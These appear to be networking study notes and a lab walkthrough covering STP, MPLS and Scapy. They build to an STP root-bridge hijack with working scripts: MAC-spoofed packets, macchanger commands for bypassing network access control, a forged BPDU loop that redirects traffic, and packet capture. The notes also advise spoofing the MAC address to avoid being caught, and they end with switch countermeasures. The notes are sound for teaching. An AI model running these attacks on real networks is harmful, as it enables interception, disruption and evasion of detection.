Question : In a network topology if there are multiple system linked , how do the data packets know which port to flow through ?

This can cause the data packets to revolve in a circular method never reaching the destination ?

ANSWER :

Spanning Tree Protocol :

  • If there are 3 VLAN , each would have their own STP Topology.
  • Each VLAN will have a VLAN ID
  • Root bridge is elected in each of the VLAN based on the lowest bridge priority.
  • Bridge priority has default value of 32768 (Unless a custom ID is assigned)+ VLAN id number and then the MAC address. Media Access Control is a globally unique address.

Question : Can the root bridge be changed and how ?

ANSWER : Root bridge can be changed in the topology by using the CLI and assigning a customer priority value to the switch , in that case a re-election of the root bridge will be carried out.

Question : When we execute the Layer 2 ether command it gives us the MAC address of our own PC , if we use this method won't we be caught sending malicious packets into the network ?

Answer : This is  why it is extremely important that we spoof our MAC address when we are sending in malicious packets into the network.

from scapy.all import *

# Create a TCP SYN packet with fake MAC and IP
packet = Ether(src="00:11:22:33:44:55") / \
         IP(src="10.0.0.5", dst="10.0.0.1") / \
         TCP(dport=80, flags="S")

# Send the packet
sendp(packet, iface="eth0")  # Change "eth0" to your actual network interface

QUESTION : How do we send packets into the network using the interactive shell and secondly using a python script ?

ANSWER:

Using python script:

from scapy.all import *

# 1. Sending an ICMP packet (Ping)

icmp_packet = IP(dst="192.168.1.1") / ICMP()
send(icmp_packet)
print("ICMP packet sent")

# 2. Sending a TCP SYN packet

tcp_packet = IP(dst="192.168.1.1") / TCP(dport=80, flags="S")
send(tcp_packet)
print("TCP SYN packet sent")

# 3. Sending an Ethernet frame (Layer 2)
                    # dst is the destination MAC address and pdst is the destination IP address
ethernet_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.255")
sendp(ethernet_packet, iface="eth0")  # Specify the correct interface for your system
print("Ethernet packet sent")

QUESTION : WHAT IS MPLS and how does that result in more efficient packet travel ?

ANSWER : MPLS is multiprotocol label switching in which instead of all the routers examining the destination IP address , when the packet enters the MPLS network the perimeter router assigns a specific label, intermediate switch reads the label number instead of the destination IP address and routes the packet accordingly.

The final router takes off the label and reads the Destination IP address from the routing table and sends through the packet.
This whole process prevents each of the router from having to read the destination IP address and the read through the routing table.

Physical/Virtual Topology

  • Switch (STP-enabled): Controls Layer 2 forwarding.
  • Target Machine (Windows 10/Linux): A normal workstation.
  • Attacker Machine (Kali Linux/Ubuntu): Running Scapy to sniff and inject packets.

Attacker Machine Setup

  • Running Kali Linux (or Ubuntu with Scapy installed).
  • Connected to the network via Ethernet/WiFi (same VLAN as target).
  • Has access to broadcast traffic (if on a hub or a mirrored port).

2Ô∏è‚É£ Gaining Network Access

How the Attacker Joins the Network

The attacker can connect in multiple ways:

  1. Plug into an open Ethernet port (e.g., in an office environment).

  2. Join the Wi-Fi network (if credentials are obtained via phishing or guest access).

  3. Bypass NAC (Network Access Control) using MAC spoofing:

     

    `# Change MAC address
sudo ifconfig eth0 down
sudo macchanger -r eth0
sudo ifconfig eth0 up`
    `# Change MAC address
sudo ifconfig eth0 down
sudo macchanger -r eth0
sudo ifconfig eth0 up`

    This makes the attacker appear as a legitimate device on the network.

    üìå Role of Wireshark in This Step

    • Check network DHCP traffic (to find an IP lease).
    • Filter with eth.src == <spoofed MAC> to see if the spoofing worked.
    • Ensure the attacker receives ARP/DHCP responses, confirming access.

  • This captures broadcast, multicast, and unicast packets.
  • Useful for identifying STP BPDUs, ARP requests, and DHCP traffic.

 

Capturing Only BPDU Packets (STP)

from scapy.all import sniff

# Filter BPDU packets (STP uses MAC 01:80:c2:00:00:00)
# The MAC address 01:80:c2:00:00:00 is a well-known reserved multicast MAC address used in IEEE 802.1D (Spanning Tree Protocol, STP) and other Layer 2 control protocols.

sniff(filter="ether dst 01:80:c2:00:00:00", prn=lambda pkt: pkt.show(), count=5)

QUESTION : What is a lambda function and what exactly is the purpose that it resolves ?

ANSWER : Lambda is a temporary function that we create within python to carry out a small task, this can come in handy as we would not be required to define a separate function as the job can be carried out using lambda itself.

üìå What’s Captured?

  • Packets with Spanning Tree Protocol (STP) information.
  • Shows Root Bridge ID, Bridge Priority, and Port Roles.

 

üìå Role of Wireshark in This Step

  • Filter STP packets: Use stp in Wireshark to capture only BPDU packets.
  • Inspect Root Bridge: Analyze Bridge ID and Path Cost fields.
  • Save to .pcap: File -> Save As -> original_bpdu.pcap for later comparison.

4Ô∏è‚É£ Manipulating & Sending Packets

The goal is to send malicious STP BPDUs to force a new Root Bridge election.

Understanding the STP Packet

A BPDU (Bridge Protocol Data Unit) contains:

  • Root Bridge ID (The switch that should control the network)
  • Bridge Priority (Lower priority means a higher chance of becoming the Root Bridge)
  • Path Cost (Determines the best path)

Crafting a Fake BPDU to Become Root

from scapy.all import *

# Construct Fake BPDU
fake_bpdu = Ether(dst="01:80:c2:00:00:00") / LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / STP(
             rootid=0x0001, # Low Priority Root Bridge ID 
             bridgeid=0x1000, # Fake Bridge ID 
             cost=0, # Force best path
             )
             

# Send BPDU Packet Repeatedly
sendp(fake_bpdu, iface="eth0", loop=1, inter=2)
from scapy.all import *

# Construct Fake BPDU
fake_bpdu = Ether(dst="01:80:c2:00:00:00") / LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / STP(
             rootid=0x0001, # Low Priority Root Bridge ID 
             bridgeid=0x1000, # Fake Bridge ID 
             cost=0, # Force best path
             )
             

# Send BPDU Packet Repeatedly
sendp(fake_bpdu, iface="eth0", loop=1, inter=2)

üìå What Happens?

  • The switch receives our forged BPDU.
  • It elects the attacker's machine as the Root Bridge.
  • The network topology changes, redirecting traffic through the attacker's machine.

 

üìå Role of Wireshark in This Step

  • Before sending fake BPDUs: Compare the original STP state (show spanning-tree )this has to be executed on the switch.

  • In wireshark we cannot execute this command but using the filter stp we're able to filter out all the BDP packets.Once we click on the packets and open the STP section we can gather all the information about the STP in our topology.

  • After attack execution: Capture new BPDU packets with:

    stp

    and inspect Bridge ID changes.

  • Save manipulated BPDU capture: attack_bpdu.pcap.

5Ô∏è‚É£ Verifying the Attack

Checking STP Status on the Target Switch

On a Cisco switch, use:

show spanning-tree

üîç Expected Output After the Attack:

  • The Root Bridge ID changes to the attacker's machine.

  • Some ports enter blocking mode, disrupting the network.

    üìå Role of Wireshark in This Step

    • Compare original_bpdu.pcap vs attack_bpdu.pcap.
    • Look for the Root Bridge ID change in STP packets.
    • Verify the port states (Blocking, Forwarding).

6Ô∏è‚É£ Logging & Analyzing the Traffic

To maintain a record:

import pandas as pd
from scapy.all import sniff, Raw

# Store captured packets
packets = []

def packet_callback(packet):
    if Raw in packet:
        packets.append({"Time": packet.time, "Src": packet.src, "Dst": packet.dst, "Payload": bytes(packet[Raw])})

# Capture 50 packets
sniff(prn=packet_callback, count=50)

# Save to CSV
df = pd.DataFrame(packets)
df.to_csv("captured_traffic.csv", index=False)

üìå Why Log Traffic?

  • Detect patterns (e.g., repeated requests from one source).
  • Identify malicious activities.

 

 

üìå Role of Wireshark in This Step

  • Analyze captured_traffic.csv alongside Wireshark logs.
  • Use color coding in Wireshark to highlight STP packets.
  • Graph packet flow to see how BPDU frequency changed.

7Ô∏è‚É£ Countermeasures (Defense Against Such Attacks)

1. Enable BPDU Guard

On Cisco switches, run:

conf t
interface FastEthernet 0/1
spanning-tree bpduguard enable

conf t
interface FastEthernet 0/1
spanning-tree bpduguard enable

üîç Effect: Disables ports where rogue BPDUs are detected.

2. Use 802.1X Authentication

Ensures only trusted devices connect.

802.1x is the port based authentication method, within which if a new device is attempting to enter the network it will first have to authenticate to the RADIUS server via the switch.

3. Implement Port Security

conf t
interface FastEthernet 0/1
switchport port-security maximum 1
switchport port-security violation shutdown

conf t
interface FastEthernet 0/1
switchport port-security maximum 1
switchport port-security violation shutdown

üîç Effect: Limits one MAC per port, preventing spoofing attacks.
